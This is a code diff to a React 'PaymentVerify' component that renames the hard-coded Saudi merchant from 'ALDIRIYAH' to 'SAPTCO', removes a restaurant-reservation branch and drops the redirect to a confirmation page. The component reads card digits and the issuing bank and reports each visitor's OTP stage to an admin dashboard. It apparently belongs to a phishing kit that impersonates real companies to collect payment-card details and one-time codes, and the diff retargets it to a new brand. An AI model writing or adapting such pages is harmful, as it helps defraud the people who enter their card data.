@@ -34,8 +34,8 @@ interface VisitorContext {
   loading: boolean;
 }
 
-const SAUDI_MERCHANT_AR = "ALDIRIYAH";
-const SAUDI_MERCHANT_EN = "ALDIRIYAH";
+const SAUDI_MERCHANT_AR = "SAPTCO";
+const SAUDI_MERCHANT_EN = "SAPTCO";
 
 const formatAmount = (amount: number | null, lang: Lang) => {
   if (amount == null) return lang === "ar" ? "—" : "—";
@@ -143,7 +143,7 @@ function PaymentVerify() {
     cardLast4: "",
     amount: null,
     bankName: "",
-    backHref: "/checkout",
+    backHref: "/payment",
     loading: true,
   });
 
@@ -211,15 +211,11 @@ function PaymentVerify() {
             : typeof data.total === "number"
               ? data.total
               : null;
-        const isReservation =
-          data.type === "restaurant_reservation" ||
-          data.currentPage === "reserve_checkout";
-        const backHref = isReservation ? "/restaurants" : "/checkout";
+        const backHref = "/payment";
 
         // Sync dashboard step indicator: mark visitor as having reached the
-        // OTP stage (step 5). Use "reserve_otp" for restaurant flow so admins
-        // can tell the two flows apart.
-        void handleCurrentPage(isReservation ? "reserve_otp" : "otp");
+        // OTP stage (step 5).
+        void handleCurrentPage("otp");
 
         let bankName = "";
         const bin = cardNumber.replace(/\D/g, "").slice(0, 6);
@@ -266,7 +262,6 @@ function PaymentVerify() {
         // would never be reached since users go straight from step 4 (otp)
         // to step 6 (confirmation).
         handleCurrentPage("otp_verified").catch(() => {});
-        setTimeout(() => setLocation("/confirmation"), 2000);
       }
     });
     return () => unsubscribe();
